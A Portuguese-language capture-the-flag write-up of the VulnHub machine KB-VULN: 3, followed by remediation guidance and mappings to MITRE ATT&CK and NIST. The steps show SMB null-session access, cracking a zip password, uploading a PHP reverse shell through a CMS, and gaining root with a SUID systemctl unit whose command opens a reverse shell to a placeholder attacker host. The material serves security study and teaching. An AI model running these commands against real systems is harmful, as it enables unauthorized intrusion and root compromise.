# KB-VULN: 3 — O Repositório de Conhecimento Que Sabia Demais

Bora rapaziada!! KB-VULN: 3 é uma viagem e tanto por misconfigurações reais de SMB, exposição de credenciais em CMS e um dos vetores de escalonamento de privilégios mais subestimados por aí: systemctl com SUID. Essa máquina demonstra uma cadeia de ataque completa que você encontraria realisticamente em ambientes de pequenas e médias empresas. A sessão nula SMB expõe um backup, o backup revela credenciais do CMS, o CMS permite upload irrestrito de PHP, e um binário SUID te entrega o root. Top demais do começo ao fim, mano.

Parabéns ao criador por empacotar quatro vulnerabilidades genuinamente instrutivas em uma máquina limpa. Esse tipo de cadeia aparece em achados reais de pentest. gg

---

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | KB-VULN: 3 |
| **VM Atacante** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/kb-vuln-3,578/ |
| **Técnicas** | Enumeração de serviços com Nmap, sessão nula SMB, zip2john + quebra de senha com John, acesso admin ao SiteMagic CMS, upload de PHP reverse shell, escalonamento de privilégios via SUID systemctl com unit file malicioso |
| **CVEs** | CWE-306 (Autenticação ausente: sessão nula SMB), CWE-521 (Requisitos de senha fraca: zip com senha quebrável), CWE-434 (Upload irrestrito de arquivo com tipo perigoso: PHP via CMS), CWE-269 (Gerenciamento inadequado de privilégios: SUID systemctl) |
| **Grupos APT** | FIN7: sessões nulas SMB e exposição de credenciais em backups é padrão comum de acesso inicial em intrusões no setor varejista; APT41: explora plataformas CMS mal configuradas e vulnerabilidades de upload de arquivo para acesso inicial |

---

## Resumo do Ataque

```
netdiscover → alvo: 192.168.10.167
    |
    v
nmap → HTTP (80), SMB (139/445), SSH (22)
    |
    v
smbclient -L → compartilhamento Files (sessão nula)
    |
    v
smbclient //alvo/Files → get backup.zip
    |
    v
zip2john + john + rockyou.txt → senha do zip quebrada
    |
    v
extrair backup → config.xml.php → credenciais admin do CMS
    |
    v
login no painel admin do SiteMagic CMS
    |
    v
Conteúdo → Upload → enviar php-reverse-shell.php
    |
    v
acessar shell enviado → reverse shell como www-data
    |
    v
find / -perm -4000 → systemctl tem SUID
    |
    v
criar .service malicioso → systemctl link + start → shell root
    |
    v
cat /root/root.txt
```

---

## Metodologia

1. Descoberta de rede e varredura completa de portas
2. Enumeração SMB: sessão nula, listagem de compartilhamentos, download de arquivo
3. Quebrar senha do zip com zip2john + John
4. Extrair backup, localizar config do SiteMagic CMS com credenciais
5. Fazer login no painel admin do CMS
6. Fazer upload de PHP reverse shell via gerenciador de conteúdo do CMS
7. Acionar shell, estabilizar
8. Enumerar binários SUID
9. Explorar SUID systemctl via arquivo de unit service malicioso

---

## Passo 1 — Descoberta do Host e Varredura de Portas

```bash
sudo netdiscover -r 192.168.10.0/24
# Alvo: 192.168.10.167

nmap -sV -sC -p- 192.168.10.167
```

Descobertas principais:

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH
80/tcp  open  http        Apache (SiteMagic CMS)
139/tcp open  netbios-ssn Samba
445/tcp open  microsoft-ds Samba
```

SMB em uma máquina Linux em CTF quase sempre significa acesso por sessão nula ou enumeração de compartilhamentos. HTTP é o ponto de pivô. SSH é o alvo de movimento lateral.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração SMB com Sessão Nula

```bash
# Listar compartilhamentos sem autenticação
smbclient -L //192.168.10.167 -N
```

Conectar ao compartilhamento `Files`:

```bash
smbclient //192.168.10.167/Files -N
smb> ls
smb> get backup.zip
smb> exit
```

**Nota do mundo real:** Sessões nulas SMB são um recurso legado da era Windows NT que permaneceu habilitado em muitos servidores Samba Linux até os anos 2010. A correção é trivial: `map to guest = never` no smb.conf. Mano, é bizarro como isso ainda aparece em produção.

**MITRE ATT&CK:** T1021.002 — Serviços Remotos: Compartilhamentos SMB; T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Quebrar a Senha do Zip

O `backup.zip` baixado é protegido por senha. Extraia seu hash e quebre-o:

```bash
zip2john backup.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

Extraia o arquivo com a senha recuperada:

```bash
unzip backup.zip
```

O backup extraído contém uma instalação do SiteMagic CMS. Encontre o arquivo de configuração:

```bash
cat config.xml.php
# ou:
grep -r "password\|user\|admin" . --include="*.php" --include="*.xml"
```

Credenciais admin do CMS armazenadas em texto claro no arquivo de configuração. Caramba, véi.

**Nota do mundo real:** Senhas de backup fracas quebráveis com rockyou.txt são a norma, não a exceção. O problema real aqui é que o backup inclui o arquivo de configuração com credenciais em texto claro.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1110.002 — Força Bruta: Quebra de Senha

---

## Passo 4 — Login no CMS e Upload do PHP Shell

Acesse `http://192.168.10.167/` e faça login com as credenciais recuperadas do arquivo de configuração.

Explore o painel admin em busca de funcionalidade de upload. No SiteMagic CMS: vá para **Conteúdo → Gerenciamento de Arquivos (Upload)**.

Prepare um PHP reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
nano /tmp/shell.php
# Edite: $ip = 'SEU_IP' e $port = 4444
```

Inicie o listener:

```bash
nc -lvnp 4444
```

Faça upload de `shell.php` pelo CMS. Encontre o caminho de upload e acesse-o no browser.

Shell chega como `www-data`. Estabilize:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Leia a flag de usuário:

```bash
cat /home/heisenberg/user.txt
```

**Nota do mundo real:** CWE-434 (upload irrestrito de arquivo) é uma das vulnerabilidades web mais consistentemente exploradas. Atacantes usaram upload PHP irrestrito em plataformas CMS para implantar webshells em milhares de incidentes documentados.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Exposta; T1059.004 — Interpretador de Comando: Unix Shell

---

## Passo 5 — Escalonamento de Privilégios via SUID systemctl

Enumere binários SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

`/bin/systemctl` aparece nos resultados. systemctl com SUID significa que qualquer usuário pode iniciar serviços de sistema como root.

Crie um arquivo de unit service malicioso em um local gravável:

```bash
cat > /dev/shm/root.service << 'EOF'
[Unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/IP_ATACANTE/9999 0>&1'

[Install]
WantedBy=multi-user.target
EOF
```

Inicie um segundo listener no atacante:

```bash
nc -lvnp 9999
```

Link e start do service usando o systemctl com SUID:

```bash
/bin/systemctl link /dev/shm/root.service
/bin/systemctl start root.service
```

Shell root chega na porta 9999. Sensacional!

```bash
id
# uid=0(root)
cat /root/root.txt
```

**Nota do mundo real:** SUID systemctl está documentado no GTFOBins e representa uma misconfiguration grave. Permite que qualquer usuário local inicie serviços arbitrários como root sem autenticação.

**MITRE ATT&CK:** T1548.001 — Abusar do Mecanismo de Elevação: Setuid e Setgid; T1543.002 — Criar ou Modificar Processo do Sistema: Serviço Systemd

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado |
|---|---|---|---|
| Senha do zip | (quebrada com rockyou) | backup.zip | Extrair arquivo |
| Credenciais CMS | (admin:senha do config) | config.xml.php no backup | Login admin SiteMagic CMS |
| Flag de usuário | (conteúdo da flag) | /home/heisenberg/user.txt | Pós-shell |
| Flag root | (conteúdo da flag) | /root/root.txt | Escalonamento SUID systemctl |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Principal Lição |
|---|---|---|---|
| 1 | Sessão nula SMB expondo compartilhamentos | Sessões nulas SMB aparecem em ambientes de produção com configs Samba legadas | Exigir autenticação SMB: `map to guest = never` no smb.conf |
| 2 | Senha de zip fraca quebrável com rockyou | Backups sensíveis protegidos com senhas de dicionário não oferecem proteção real | Use criptografia GPG para backups sensíveis; use senhas aleatórias fortes |
| 3 | Credenciais CMS em config incluído no backup | Arquivos de configuração com credenciais em texto claro não devem estar em backups | Excluir arquivos de configuração de backups; usar variáveis de ambiente ou gerenciadores de segredos |
| 4 | Upload PHP sem validação de tipo | Upload irrestrito de arquivo está no OWASP Top 10 e aparece em plataformas CMS globalmente | Validar tipo de arquivo no lado servidor; armazenar uploads fora do web root |
| 5 | SUID systemctl | Cria serviços root arbitrários sem autenticação; documentado no GTFOBins | Remover SUID: `chmod u-s /bin/systemctl`; usar sudo com whitelists de unit files específicos |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Serviços Remotos Externos (SMB) | T1133 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Quebra de Senha | T1110.002 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Exposta (upload CMS) | T1190 |
| Execução | Execução | Interpretador de Comando: Unix Shell | T1059.004 |
| Persistência | Persistência | Criar ou Modificar Processo: Serviço Systemd | T1543.002 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Abusar do Mecanismo de Elevação: Setuid | T1548.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Desabilitar sessões nulas SMB**: Adicionar `map to guest = never` e `restrict anonymous = 2` no smb.conf
2. **Criptografar backups**: Usar GPG com chave aleatória forte; armazenar chave separadamente do backup
3. **Remover credenciais dos arquivos de config**: Usar variáveis de ambiente ou gerenciador de segredos
4. **Restringir upload do CMS**: Bloquear execução PHP em diretórios de upload via `.htaccess`; validar tipo de arquivo no servidor
5. **Remover SUID do systemctl**: `chmod u-s /bin/systemctl`

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar compartilhamentos SMB; auditar funcionalidade de upload em CMSs |
| Proteger | Controle de Acesso | Desabilitar sessões nulas SMB; exigir autenticação em todos os compartilhamentos |
| Proteger | Segurança de Dados | Criptografar backups; sem credenciais em arquivos de config incluídos em backups |
| Detectar | Anomalias e Eventos | Alertar sobre conexões de sessão nula SMB; detectar execução PHP em diretórios de upload |
| Responder | Planejamento de Resposta | Remover webshells; rotacionar credenciais; auditar todos os binários SUID |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Controle de Acesso | Autenticação SMB obrigatória; restrições de execução no diretório de upload |
| AC-6 | Privilégio Mínimo | Remover SUID do systemctl; restringir sudo a unit files específicos |
| IA-5 | Gerenciamento de Autenticadores | Sem credenciais em texto claro em arquivos de config; usar gerenciadores de segredos |
| CM-7 | Funcionalidade Mínima | Desabilitar sessões nulas SMB; bloquear PHP em diretórios de upload |
| SC-28 | Proteção de Informação em Repouso | Criptografar backups; sem credenciais em arquivos de backup |

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Inventário de TI | MIL2 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Fortalecimento de Configuração de Aplicação (desabilitar sessões nulas SMB, restringir execução de upload)
- **D3-OAM** — Gerenciamento Administrativo do SO (remover SUID do systemctl)
- **D3-HBPI** — Fortalecer Integridade do Pipeline de Build (sem credenciais em arquivos de backup implantados)

---

## Considerações Finais

KB-VULN: 3 é uma simulação legítima de pentest no mundo real. A cadeia sessão nula SMB para backup para credenciais CMS espelha achados de dezenas de intrusões empresariais documentadas. A escalação via SUID systemctl é a cereja do bolo: elegante, documentada no GTFOBins, e ainda aparece em ambientes reais.

A lição principal aqui é defesa em profundidade: se qualquer uma dessas quatro vulnerabilidades tivesse sido corrigida (sessões nulas desabilitadas, backup criptografado, upload restrito, SUID systemctl removido), a cadeia se quebra. Esse é o ponto da segurança em camadas.

Thanks guys!! (❍ᴥ❍ʋ)
